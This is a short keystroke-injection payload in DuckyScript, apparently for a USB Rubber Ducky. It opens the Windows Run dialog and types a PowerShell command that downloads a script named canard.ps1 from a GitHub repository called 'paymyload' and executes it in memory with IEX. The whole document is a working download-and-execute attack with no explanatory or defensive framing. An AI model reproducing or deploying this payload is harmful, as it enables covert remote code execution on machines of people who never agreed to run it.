DELAY 1000
GUI r
DELAY 100
STRING powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jthemee/paymyload/master/canard.ps1');"
ENTER